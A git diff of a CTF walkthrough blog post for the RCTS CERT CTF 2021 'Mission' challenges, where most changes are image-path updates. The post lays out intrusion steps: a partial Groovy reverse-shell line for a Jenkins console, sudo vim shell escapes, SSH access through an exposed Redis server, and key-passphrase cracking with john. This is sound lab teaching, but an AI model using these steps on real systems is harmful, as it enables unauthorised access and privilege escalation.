@@ -1,7 +1,7 @@
 +++ 
 author = ['Abdallah Adham']
 title = "Mission Challenges Walkthrough - RCTS CERT CTF 2021"
-date = 2021-08-24T15:33:59+02:00
+date = 2021-08-24
 description = "Mission Challenges Walkthrough - RCTS CERT CTF 2021"
 draft = false
 slug = ""
@@ -40,32 +40,32 @@ Challenge_Name | Points | Tags
 [8-Locating our Attacker](#8-locating-our-attacker) | 443 | #mission #osint
 [9-Crime doesn't pay](#9-crime-doesnt-pay) | 481 | #mission
 ---
-![missions](assests/img/RCT_CERT/mission.JPG)
+![missions](post/Mission_RCTS/RCT_CERT/mission.JPG)
 
 ---
 ## *1-Something Suspicious*
 
-![smth_sus](assests/img/RCT_CERT/Smth_sus.JPG)
+![smth_sus](post/Mission_RCTS/RCT_CERT/Smth_sus.JPG)
 
 It looks like we are in a blue team in a company and your duty is to investigate some suspicious activity through logs, let's see !
 
 Let's first open **ftp.log** and see what is inside it.
 
-![ftp_log](assests/img/RCT_CERT/ftp_log.JPG)
+![ftp_log](post/Mission_RCTS/RCT_CERT/ftp_log.JPG)
 
 mhmm, It looks like there was someone trying to connect to the FTP server and also trying to bruteforce the passcode for entering the server.
 
 but there is one of the passwords looks weird and formatted as base64 which is `ZmxhZ3tzMG0zdGgxbmc=` let's decode it and see it's output.
 
-![base64_dec](assests/img/RCT_CERT/base64_dec.JPG)
+![base64_dec](post/Mission_RCTS/RCT_CERT/base64_dec.JPG)
  
  Well, it's part of the flag `flag{s0m3th1ng`, I think that is the second part is located in the '**ssh.log**, let's see it.
  
- ![ssh_log](assests/img/RCT_CERT/ssh_log.JPG)
+ ![ssh_log](post/Mission_RCTS/RCT_CERT/ssh_log.JPG)
  
  Again, Someone was trying to connect through ssh but the user's name is also weird and looks like it's base64 encode which is `X3N1c3AxYzEwdXN9`, let's decode it and see.
  
- ![base64_dec2](assests/img/RCT_CERT/base64_dec2.JPG)
+ ![base64_dec2](post/Mission_RCTS/RCT_CERT/base64_dec2.JPG)
  
  Yes, It's the second part pf the flag `_susp1c10us}`, Let's merge the two parts together.
  
@@ -77,7 +77,7 @@ The first flag :
 
 ## *2-Decrypting the payload*
 
- ![Decrypt_pay](assests/img/RCT_CERT/Decrypt_pay.JPG)
+ ![Decrypt_pay](post/Mission_RCTS/RCT_CERT/Decrypt_pay.JPG)
  
  It seems that we were late and the hacker already gained access to our network, our duty is to invesigate a malicious macro-enabled spreadsheet which is **Account_report.xlsm**, and we will try to see if there is something suspicious inside of it.
  
@@ -85,11 +85,11 @@ The first flag :
  
 `$ olevba Account_report.xlsm`
  
-![olevba](assests/img/RCT_CERT/olevba.JPG)
+![olevba](post/Mission_RCTS/RCT_CERT/olevba.JPG)
 
 By scrolling down we notice alot of suspicious Hex and Base64 which seems to be the payload that made the hacker gain access to the network.
 
-![olevba2](assests/img/RCT_CERT/olevba2.JPG)
+![olevba2](post/Mission_RCTS/RCT_CERT/olevba2.JPG)
 
 Okay, Let's collect all of them together and remove all the unnecessary characters and decode them with Hex.
 
@@ -215,13 +215,13 @@ The second flag :
 
 ## *3-Locked Outside*
 
-![locked_out](assests/img/RCT_CERT/locked_out.JPG)
+![locked_out](post/Mission_RCTS/RCT_CERT/locked_out.JPG)
 
 After we succeeded in locating the payload, Now we need investigate the compromised machine that led to the attack and recover a lost **SSH** from it. Let's go !
 
 First, we need to boot up the machine in our local network, it has the name **lockedout**.
 
-![lockedout](assests/img/RCT_CERT/lockedout.JPG)
+![lockedout](post/Mission_RCTS/RCT_CERT/lockedout.JPG)
 
 We need to do some Scanning in order to know what services are running in this machine.
 
@@ -234,7 +234,7 @@ Also we can see that the machines has been asigned with a new ip address which i
 > -sV
 : determine service/version info.
 
-![nmap1](assests/img/RCT_CERT/nmap1.JPG)
+![nmap1](post/Mission_RCTS/RCT_CERT/nmap1.JPG)
 
 We can see that there are 3 ports opened for **FTP**, **SSH** and **HTTP**, Let's see what we can do with the FTP server.
 
@@ -243,19 +243,19 @@ If we made a Recon process on this ftp server version we will not find any explo
 
 If we try to login to the ftp server with any username except **anonymous**, It won't connect to it.
 
-![ftp](assests/img/RCT_CERT/ftp.JPG)
+![ftp](post/Mission_RCTS/RCT_CERT/ftp.JPG)
 
 After we sucessfully connected to the server, Now we need to know if there are any shared files that we can use.
 
 We located a text file named as **note.txt**, Let's get it in our machine and see what is inside of it.
 
-![note](assests/img/RCT_CERT/note.JPG)
+![note](post/Mission_RCTS/RCT_CERT/note.JPG)
 
 Unfortunately, If we try to connect with ssh with these credentials it won't connect, So there is another way i think.
 
 Let's see what is in the web page!
 
-![jenkins](assests/img/RCT_CERT/jenkins.JPG)
+![jenkins](post/Mission_RCTS/RCT_CERT/jenkins.JPG)
 
 If we do sime Recon we will find that **Jenkins** have some vulnerabilites that we can exploit in order to have access to the target.
 
@@ -269,13 +269,13 @@ Done, we found the password which is **admin** too.
 
 Let's login and find out what is up there!
 
-![jenkins2](assests/img/RCT_CERT/jenkins2.JPG)
+![jenkins2](post/Mission_RCTS/RCT_CERT/jenkins2.JPG)
 
 It looks like a dashboard full of interesting staff that we can use :smiling_imp:.
 
 Something look catchy which is **Build Executor Status**, Let's navigate to it!
 
-![jenkins3](assests/img/RCT_CERT/jenkins3.JPG)
+![jenkins3](post/Mission_RCTS/RCT_CERT/jenkins3.JPG)
 
 Wait a minute!
 
@@ -283,17 +283,17 @@ It looks like Jenkins executor is allowing a build to run on a node/agent(e.g. b
 
 Let's navigate to the **Master** and see what is inside!
 
-![jenkins4](assests/img/RCT_CERT/jenkins4.JPG)
+![jenkins4](post/Mission_RCTS/RCT_CERT/jenkins4.JPG)
 
 Wow! Is This a **Script console**, We are getting closer and closer :grin:.
 
-![jenkins5](assests/img/RCT_CERT/jenkins5.JPG)
+![jenkins5](post/Mission_RCTS/RCT_CERT/jenkins5.JPG)
 
 Yes, It looks like Jenkins features a Groovy script console which allows one to run arbitrary Groovy scripts within the Jenkins controller runtime or in the runtime on agents.
 
 Let's run some commands!
 
-![jenkins6](assests/img/RCT_CERT/jenkins6.JPG)
+![jenkins6](post/Mission_RCTS/RCT_CERT/jenkins6.JPG)
 
 Ooh, Let's see if we can get full access to the machine through **Reverse Shell**, I found this [Github Repo](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) that gives shell execution in Groovy Script. 
 
@@ -308,7 +308,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 Now, We initialize our listener to recieve the reverse shell.
 
-![listener](assests/img/RCT_CERT/listener.JPG)
+![listener](post/Mission_RCTS/RCT_CERT/listener.JPG)
 
 Yes, We are in! :partying_face:
 
@@ -316,7 +316,7 @@ Now, We have escalate to **Root** privilage to navigate to the ssh configuration
 
 Let's see what Jenkins can do under root privilage by running this command **`$ sudo -l`**.
 
-![sudo](assests/img/RCT_CERT/sudo.JPG)
+![sudo](post/Mission_RCTS/RCT_CERT/sudo.JPG)
 
 So, Jenkins can execute **Vim** text editor under root privilage, Let's see if we can change to root inside vim.
 
@@ -324,17 +324,17 @@ So, Jenkins can execute **Vim** text editor under root privilage, Let's see if w
 
 Then, inside vim we type `:!/bin/sh`.
 
-![vim](assests/img/RCT_CERT/vim.JPG)
+![vim](post/Mission_RCTS/RCT_CERT/vim.JPG)
 
 Yes, We made it!
 
 We are now in root privilage, Let's search for everything having **ssh** keyword by typing this `find / -iname "ssh*" 2>/dev/null`.
 
-![find](assests/img/RCT_CERT/find.JPG)
+![find](post/Mission_RCTS/RCT_CERT/find.JPG)
 
 Let's navigate to **/etc/ssh/sshd_config**, and what is inside of it.
 
-![sshd](assests/img/RCT_CERT/sshd.JPG)
+![sshd](post/Mission_RCTS/RCT_CERT/sshd.JPG)
 
 Oh, It seems we already found the flag! :roll_eyes:
 
@@ -346,17 +346,17 @@ The third flag :
 
 ## *4-Changing our locks and dumping old keys*
 
-![change_locks](assests/img/RCT_CERT/change_locks.JPG)
+![change_locks](post/Mission_RCTS/RCT_CERT/change_locks.JPG)
 
 It seems that the hacker injected a script that maintain the persistence in the machine.
 
 While we still have access to the machine, We type this command to all services that are running in crontab `sudo crontab -u root -l`.
 
-![crontab](assests/img/RCT_CERT/crontab.JPG)
+![crontab](post/Mission_RCTS/RCT_CERT/crontab.JPG)
 
 Well, It seems we found the persistence script named as **stayalive**, Let's check it!
 
-![stayalive](assests/img/RCT_CERT/stayalive.JPG)
+![stayalive](post/Mission_RCTS/RCT_CERT/stayalive.JPG)
 
 It looks like it is a compiled **.pyc** file, Which we need to decompile, You can check how to decompile it from [Here](https://stackoverflow.com/questions/5287253/is-it-possible-to-decompile-a-compiled-pyc-file-into-a-py-file).
 
@@ -475,7 +475,7 @@ for i in tt:
     print(xbx[i],end="")
 ```
 
-![python](assests/img/RCT_CERT/python.JPG)
+![python](post/Mission_RCTS/RCT_CERT/python.JPG)
 
 Here it is!
 
@@ -487,24 +487,24 @@ The fourth flag :
 
 ## *5-Know your enemy*
 
-![know_enemy](assests/img/RCT_CERT/know_enemy.JPG)
+![know_enemy](post/Mission_RCTS/RCT_CERT/know_enemy.JPG)
 
 Now our duty is to investigate the source of the attack, Let's see this web page!
 
-![hyperion1](assests/img/RCT_CERT/hyperion1.JPG)
+![hyperion1](post/Mission_RCTS/RCT_CERT/hyperion1.JPG)
 
 It look like a normal web page, We can see the source page.
 
 
-![hyperion2](assests/img/RCT_CERT/hyperion2.JPG)
+![hyperion2](post/Mission_RCTS/RCT_CERT/hyperion2.JPG)
 
 Nothing much to see. Let's head back and see what will happen if we submitted any fake e-mail.
 
-![hyperion3](assests/img/RCT_CERT/hyperion3.JPG)
+![hyperion3](post/Mission_RCTS/RCT_CERT/hyperion3.JPG)
 
 mhmm, Let's see what is going on in the web console.
 
-![hyperion4](assests/img/RCT_CERT/hyperion4.JPG)
+![hyperion4](post/Mission_RCTS/RCT_CERT/hyperion4.JPG)
 
 Wow, It looks like when we submit any e-mail, we recieve this output in the web console.
 
@@ -516,25 +516,25 @@ Rm9sbG93aW5nIHRoZSBjcnVtYmxlcyBhcmUgd2U/IFZlcnkgZ29vZCwgeW91IHdpbGwgbmVlZCB0aGUg
 
 Let's decode it and see!
 
-![base64_dec3](assests/img/RCT_CERT/base64_dec3.JPG)
+![base64_dec3](post/Mission_RCTS/RCT_CERT/base64_dec3.JPG)
 
 Ooh, It turned into another way of encryption which i believe is **Vigenère Cipher**, Let's decrypt it!
 
-![vignere](assests/img/RCT_CERT/vignere.JPG)
+![vignere](post/Mission_RCTS/RCT_CERT/vignere.JPG)
 
 Another encoding which is i think is **Hexa-decimal**, Let's decode it!
 
-![Hex1](assests/img/RCT_CERT/Hex1.JPG)
+![Hex1](post/Mission_RCTS/RCT_CERT/Hex1.JPG)
 
 More Encryption!!
 
 This time is **Caesar Cipher** if i'm not wrong, Let's encrypt it!
 
-![caesar](assests/img/RCT_CERT/caesar.JPG)
+![caesar](post/Mission_RCTS/RCT_CERT/caesar.JPG)
 
 Well, This time we need to make a **POST request** using our beloved **Burpsuite**, Let's do it.
 
-![burp](assests/img/RCT_CERT/burp.JPG)
+![burp](post/Mission_RCTS/RCT_CERT/burp.JPG)
 
 ```
 ++++++++[>+>++>+++>++++>+++++>++++++>+++++++>++++++++>+++++++++>++++++++++>+++++++++++>++++++++++++>+++++++++++++>++++++++++++++>+++++++++++++++>++++++++++++++++<<<<<<<<<<<<<<<<-]>>>>>>>>>>>-.+<<<<<<<<<<<>>>>>>>>>>>>>---.+++<<<<<<<<<<<<<>>>>>>>>>>>>>>----.++++<<<<<<<<<<<<<<>>>>>>>>>>>>+++.---<<<<<<<<<<<<>>>>>>>>>>>>>>-.+<<<<<<<<<<<<<<>>>>>>>>>>>>>>---.+++<<<<<<<<<<<<<<>>>>>>>>>>>>>---.+++<<<<<<<<<<<<<>>>>.<<<<>>>>>>>>>>>>>>>----.++++<<<<<<<<<<<<<<<>>>>>>>>>>>>>>-.+<<<<<<<<<<<<<<>>>>.<<<<>>>>>>>>>.<<<<<<<<<>>>>>>>>>>>>>>>+.-<<<<<<<<<<<<<<<>>>>>>>>>>>>>>.<<<<<<<<<<<<<<>>>>>>>>>>>>>---.+++<<<<<<<<<<<<<>>>>>>>>>>>>>>++.--<<<<<<<<<<<<<<>>>>>>>>>>>>>+.-<<<<<<<<<<<<<>>>>>>>>>>>>>>-.+<<<<<<<<<<<<<<>>>>>>>>>>>>>>--.++<<<<<<<<<<<<<<>>>>+.-<<<<>>>>.<<<<>>>>>>>>>>>+.-<<<<<<<<<<<>>>>>>>>>>>>>>-.+<<<<<<<<<<<<<<>>>>>>>>>>>>>>>---.+++<<<<<<<<<<<<<<<>>>>>>>>>>>>>>++.--<<<<<<<<<<<<<<>>>>.<<<<>>>>>>>>>>>>>>.<<<<<<<<<<<<<<>>>>>>>>>>>>+.-<<<<<<<<<<<<>>>>>>>>>>>>>>+++.---<<<<<<<<<<<<<<>>>>>>>>>>>>>>+++.---<<<<<<<<<<<<<<>>>>>>>>>>>>>>.<<<<<<<<<<<<<<>>>>>>>>>>>>>.<<<<<<<<<<<<<>>>>>>>>>>>>>>++.--<<<<<<<<<<<<<<>>>>>>>>>>>>+.-<<<<<<<<<<<<>>>>>>>>>>>>>>+++.---<<<<<<<<<<<<<<>>>>>>>>>>>>>---.+++<<<<<<<<<<<<<>>>>.<<<<>>>>>>>>>>>>>+.-<<<<<<<<<<<<<>>>>>>>>>>>>>>+++.---<<<<<<<<<<<<<<>>>>.<<<<>>>>>-.+<<<<<>>>>>>>>>>>>>--.++<<<<<<<<<<<<<>>>>>>>>>>>>>>----.++++<<<<<<<<<<<<<<>>>>>>>>>>>>+.-<<<<<<<<<<<<>>>>>>>>>>>>>-.+<<<<<<<<<<<<<>>>>>>>>>>>>>>>+++.---<<<<<<<<<<<<<<<>>>>>>>>>.<<<<<<<<<>>>>>>>>>>>>>>>+.-<<<<<<<<<<<<<<<>>>>>>>>>>>>>>.<<<<<<<<<<<<<<>>>>>>+++.---<<<<<<>>>>>>>>>>>>>>++.--<<<<<<<<<<<<<<>>>>>>+.-<<<<<<>>>>>>.<<<<<<>>>>>>>>>>>>>>--.++<<<<<<<<<<<<<<>>>>>>>>>>>>-.+<<<<<<<<<<<<>>>>>>>>>>>>>>>----.++++<<<<<<<<<<<<<<<>>>>>>>>>>>>>.<<<<<<<<<<<<<>>>>>>+++.---<<<<<<>>>>>>>>>>>>-.+<<<<<<<<<<<<>>>>>>>>>>>>>-.+<<<<<<<<<<<<<>>>>>>.<<<<<<>>>>>>>>>>>>>----.++++<<<<<<<<<<<<<>>>>>>>>>>>>-.+<<<<<<<<<<<<>>>>>>.<<<<<<>>>>>>>>>>>>>--.++<<<<<<<<<<<<<>>>>>>>>>>>>-.+<<<<<<<<<<<<>>>>>>>>>>>>>>----.++++<<<<<<<<<<<<<<>>>>>>+.-<<<<<<>>>>>>>>>>>>>-.+<<<<<<<<<<<<<>>>>>>>>>>>>>.<<<<<<<<<<<<<>>>>>>>>>>>>>>>----.++++<<<<<<<<<<<<<<<>>>>+.-<<<<>>>>>>>>>>>>>>>>---.+++<<<<<<<<<<<<<<<<>>>>>-.+<<<<<>>>>.<<<<>>>>>>>>>>>>+.-<<<<<<<<<<<<>>>>>>>>>>>>>>--.++<<<<<<<<<<<<<<>>>>>>>>>>>>>----.++++<<<<<<<<<<<<<>>>>.<<<<>>>>>>>>>>>>>>>+.-<<<<<<<<<<<<<<<>>>>>>>>>>>>>>-.+<<<<<<<<<<<<<<>>>>>>>>>>>>>>>---.+++<<<<<<<<<<<<<<<>>>>>>>>>>>>>>++.--<<<<<<<<<<<<<<>>>>.<<<<>>>>>>>>>>>>+++.---<<<<<<<<<<<<>>>>>>>>>>>>>>++.--<<<<<<<<<<<<<<>>>>>>>>>>>>>---.+++<<<<<<<<<<<<<>>>>>>>>>>>>>----.++++<<<<<<<<<<<<<>>>>>>>>>>>>>---.+++<<<<<<<<<<<<<>>>>>>>>>>>>>>--.++<<<<<<<<<<<<<<>>>>>>>>>>>>>>>----.++++<<<<<<<<<<<<<<<>>>>>>>>>>>>>+.-<<<<<<<<<<<<<>>>>>>>>>>>>+.-<<<<<<<<<<<<>>>>>>>>>>>>>>----.++++<<<<<<<<<<<<<<>>>>>>>>>>>>>>+++.---<<<<<<<<<<<<<<>>>>.<<<<>>>>>>>>>>>>+.-<<<<<<<<<<<<>>>>>>>>>>>>>>++.--<<<<<<<<<<<<<<>>>>>>>>>>>>>---.+++<<<<<<<<<<<<<>>>>>>>++.--<<<<<<<>>>>.<<<<>>>>>>>>>>>>>.<<<<<<<<<<<<<>>>>>>>>>>>>>>>+.-<<<<<<<<<<<<<<<>>>>>>>>>>>>>>.<<<<<<<<<<<<<<>>>>>>>>>>>>>---.+++<<<<<<<<<<<<<>>>>>>>>>>>>>>++.--<<<<<<<<<<<<<<>>>>>>>>>>>>>+.-<<<<<<<<<<<<<>>>>>>>>>>>>>>-.+<<<<<<<<<<<<<<>>>>>>>>>>>>>>--.++<<<<<<<<<<<<<<>>>>>>>>>>>>-.+<<<<<<<<<<<<>>>>>>+.-<<<<<<>>>>>>>+.-<<<<<<<>>>>>>>-.+<<<<<<<>>>>>>++.--<<<<<<>>>>>>>++.--<<<<<<<>>>>>>>>+.-<<<<<<<<>>>>>>>>>>>>>>--.++<<<<<<<<<<<<<<>>>>>>>>>>>>+++.---<<<<<<<<<<<<>>>>>>>>>>>---.+++<<<<<<<<<<<>>>>>>++.--<<<<<<>>>>>>>>>>>>>---.+++<<<<<<<<<<<<<>>>>>>>>>>>>>++.--<<<<<<<<<<<<<>>>>>>>>>>>>>----.++++<<<<<<<<<<<<<>>>>>>>>>>----.++++<<<<<<<<<<>>>>>>>--.++<<<<<<<>>>>>>>>>>>>>>-.+<<<<<<<<<<<<<<>>>>>>>>>>>>>>>----.++++<<<<<<<<<<<<<<<>>>>>>>>>>>>>>.<<<<<<<<<<<<<<>>>>+++.---<<<<.
@@ -542,7 +542,7 @@ Well, This time we need to make a **POST request** using our beloved **Burpsuite
 
 I think this pattern is familiar to me, It's **Brainfuck language**, Let's solve it!
 
-![brainfuck](assests/img/RCT_CERT/brainfuck.JPG)
+![brainfuck](post/Mission_RCTS/RCT_CERT/brainfuck.JPG)
 
 Yes, We got it !
 
@@ -554,19 +554,19 @@ The fifth flag :
 
 ## *6-Blue team becomes Red Team*
 
-![blue_red](assests/img/RCT_CERT/blue_red.JPG)
+![blue_red](post/Mission_RCTS/RCT_CERT/blue_red.JPG)
 
 The table is reversed now, It's our turn to attack now :smiling_imp:.
 
 First, We need to setup the machine in our local network.
 
-![hyperion5](assests/img/RCT_CERT/hyperion5.JPG)
+![hyperion5](post/Mission_RCTS/RCT_CERT/hyperion5.JPG)
 
 It is named as **hyp3r10n** and assigned with ip address **192.168.1.4**.
 
 Let's do **nmap** to scan all the ports that are opened in that machine.
 
-![nmap2](assests/img/RCT_CERT/nmap2.JPG)
+![nmap2](post/Mission_RCTS/RCT_CERT/nmap2.JPG)
 
 There are 3 opened ports for **SSH**, **HTTP** and **Redis**.
 
@@ -582,7 +582,7 @@ First, We have to connect to the server with this command `redis-cli -h 192.168.
 
 Then, we type `config get *` to find the home of the redis user (usually **/var/lib/redis** or **/home/redis/.ssh**).
 
-![redis1](assests/img/RCT_CERT/redis1.JPG)
+![redis1](post/Mission_RCTS/RCT_CERT/redis1.JPG)
 
 Also we found the home of the redis user is located in **/var/lib/redis**.
 
@@ -602,23 +602,23 @@ We will follow this steps to gain access through SSH to the machine.
 
 And what what we have done.
 
-![redis2](assests/img/RCT_CERT/redis2.JPG)
+![redis2](post/Mission_RCTS/RCT_CERT/redis2.JPG)
 
 Now the last step is to connect to the machine with ssh `ssh -i id_rsa redis@192.168.1.4`.
 
 **NOTE** Use the same passphrase as the one you've set at ssh_key.
 
-![redis3](assests/img/RCT_CERT/redis3.JPG)
+![redis3](post/Mission_RCTS/RCT_CERT/redis3.JPG)
 
 Yes, We are in!
 
 But we entered with redis service .. We need to escalate to the user privilage.
 
-![redis4](assests/img/RCT_CERT/redis4.JPG)
+![redis4](post/Mission_RCTS/RCT_CERT/redis4.JPG)
 
 It looks like there is a user named as **hype**, maybe we can escalate to it.
 
-![redis5](assests/img/RCT_CERT/redis5.JPG)
+![redis5](post/Mission_RCTS/RCT_CERT/redis5.JPG)
 
 So, We can escalate to **hype** by typing this command `sudo -u hype /usr/bin/vim /home/hype/backup.sh`.
 
@@ -626,21 +626,21 @@ It will open the **backup.sh** with **Vim** under **hype** privilage.
 
 Then inside vim we type `:!/bin/ash`, then hit enter.
 
-![redis6](assests/img/RCT_CERT/redis6.JPG)
+![redis6](post/Mission_RCTS/RCT_CERT/redis6.JPG)
 
 Yes, we are now hype :partying_face:.
 
-![redis7](assests/img/RCT_CERT/redis7.JPG)
+![redis7](post/Mission_RCTS/RCT_CERT/redis7.JPG)
 
 Now let's head to **/home/hype** and see what is inside!
 
-![redis8](assests/img/RCT_CERT/redis8.JPG)
+![redis8](post/Mission_RCTS/RCT_CERT/redis8.JPG)
 
 Let's see what is inside **user.txt** ?
 
 It is the flag!
 
-![redis9](assests/img/RCT_CERT/redis9.JPG)
+![redis9](post/Mission_RCTS/RCT_CERT/redis9.JPG)
 
 The sixth flag :
  
@@ -650,7 +650,7 @@ The sixth flag :
 
 ## *7-Getting the crown jewels*
 
-![crown_jewels](assests/img/RCT_CERT/crown_jewels.JPG)
+![crown_jewels](post/Mission_RCTS/RCT_CERT/crown_jewels.JPG)
 
 It seems that there is a **Private SSH key** that we can make use of it..But first we need to find it and crack it's password.
 
@@ -658,7 +658,7 @@ If we navigate through **backups** we will find **ssh directory**, When we enter
 
 If we opened **note.txt**, it says `This is a backup of my private key, just in case`, So **id_rsa.bak** contains the **Private SSH key**.
 
-![root1](assests/img/RCT_CERT/root1.JPG)
+![root1](post/Mission_RCTS/RCT_CERT/root1.JPG)
 
 Let's try to **Brute-force** it!
 
@@ -672,7 +672,7 @@ We will use the most famous wordlist which is **Rockyou**.
  
 `john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash`.
 
-![root2](assests/img/RCT_CERT/root2.JPG)
+![root2](post/Mission_RCTS/RCT_CERT/root2.JPG)
 
 Hurray! We got the password which is **barcelona1**.
 
@@ -680,17 +680,17 @@ But what is this password for? :thinking:
 
 Let's see if we can escalate to **root privilage** with this password.
 
-![root3](assests/img/RCT_CERT/root3.JPG)
+![root3](post/Mission_RCTS/RCT_CERT/root3.JPG)
 
 Yes, We are now have root privilage :partying_face:. 
 
 Let's head to root directory and see what is inside of it!
 
-![root4](assests/img/RCT_CERT/root4.JPG)
+![root4](post/Mission_RCTS/RCT_CERT/root4.JPG)
 
 Let's see what is inside **root.txt**!
 
-![root5](assests/img/RCT_CERT/root5.JPG)
+![root5](post/Mission_RCTS/RCT_CERT/root5.JPG)
 
 Yes, It is the flag!
 
@@ -702,7 +702,7 @@ The seventh flag :
 
 ## *8-Locating our Attacker*
 
-![locate_hacker](assests/img/RCT_CERT/locate_hacker.JPG)
+![locate_hacker](post/Mission_RCTS/RCT_CERT/locate_hacker.JPG)
 
 **Note** This is different flag format, we need **BSSID** and **email** in this format ** flag{'BSSID'_'email'}**
 
@@ -722,7 +722,7 @@ When we unzipped the **home.zip**, It gave us two outputs which are **IMG_3953.J
 
 If we opened the image this is how it looks.
 
-![hacker1](assests/img/RCT_CERT/hacker1.JPG)
+![hacker1](post/Mission_RCTS/RCT_CERT/hacker1.JPG)
 
 and if we opened **Wifi config.txt**, This is the output.
 
@@ -744,7 +744,7 @@ It seems that the image is taken for a pharmacy in **Barcelona, Spain** and name
 
 Let's search for it in **WiGLE.net** map !
 
-![hacker2](assests/img/RCT_CERT/hacker2.JPG)
+![hacker2](post/Mission_RCTS/RCT_CERT/hacker2.JPG)
 
 After this we need to copy the **Latitude** and **Longitude**.
 
@@ -757,11 +757,11 @@ Now let's head to the **View** section and then **Basic Search**.
 
 Then, We fill all the information about the **WIFI Configuration**.
 
-![hacker3](assests/img/RCT_CERT/hacker3.JPG)
+![hacker3](post/Mission_RCTS/RCT_CERT/hacker3.JPG)
 
 Yes, We found it!
 
-![hacker4](assests/img/RCT_CERT/hacker4.JPG)
+![hacker4](post/Mission_RCTS/RCT_CERT/hacker4.JPG)
 
 We found the **BSSID : F8:8E:85:C6:56:F8**, Now we need to find the **Hacker's E-mail**.
 
@@ -769,7 +769,7 @@ Let's head back to our root directory, Then `Projects > Scripts`.
 
 And we type `ls -al` to list all the contents in the directory whether hidden or not.
 
-![hacker5](assests/img/RCT_CERT/hacker5.JPG)
+![hacker5](post/Mission_RCTS/RCT_CERT/hacker5.JPG)
 
 As we can see those scripts **rshell.ino** and **wifigrabber.ino** were used by the hacker to hack the **WIFI**.
 
@@ -777,7 +777,7 @@ If we opened them, It won't led to anything.
 
 Let's see what is inside **.git directory**.
 
-![hacker6](assests/img/RCT_CERT/hacker6.JPG)
+![hacker6](post/Mission_RCTS/RCT_CERT/hacker6.JPG)
 
 Let's view **FETCH_HEAD** and see what does it show!
 
@@ -787,7 +787,7 @@ da59093e90bdad57ad87f67d295a5e85ded7f941    branch 'main' of https://github.com/
 
 Well, We have a **Github Account**, Let's go to the link!
 
-![hacker7](assests/img/RCT_CERT/hacker7.JPG)
+![hacker7](post/Mission_RCTS/RCT_CERT/hacker7.JPG)
 
 Now, We need to get the **Email Address** from this Github user account.
 
@@ -803,7 +803,7 @@ Now, We need to get the **Email Address** from this Github user account.
 
 5. Press Ctrl+F and search for “email”.
 
-![hacker8](assests/img/RCT_CERT/hacker8.JPG)
+![hacker8](post/Mission_RCTS/RCT_CERT/hacker8.JPG)
 
 We found the **Hacker's Email Address** which is **mateossanti0@gmail.com** :partying_face:!
 
@@ -817,7 +817,7 @@ The eighth flag :
 
 ## *9-Crime doesn't pay*
 
-![crime_pay](assests/img/RCT_CERT/crime_pay.JPG)
+![crime_pay](post/Mission_RCTS/RCT_CERT/crime_pay.JPG)
 
 Now we are done with the hacker, We need to finish the report with some information regarding the incident.
 
@@ -869,6 +869,6 @@ The ninth flag :
 
 ### That is all of it..Happy Hunt :smiling_imp:!
 
-![pyke3](assests/img/RCT_CERT/pyke3.gif)
+![pyke3](post/Mission_RCTS/RCT_CERT/pyke3.gif)
 
 ---
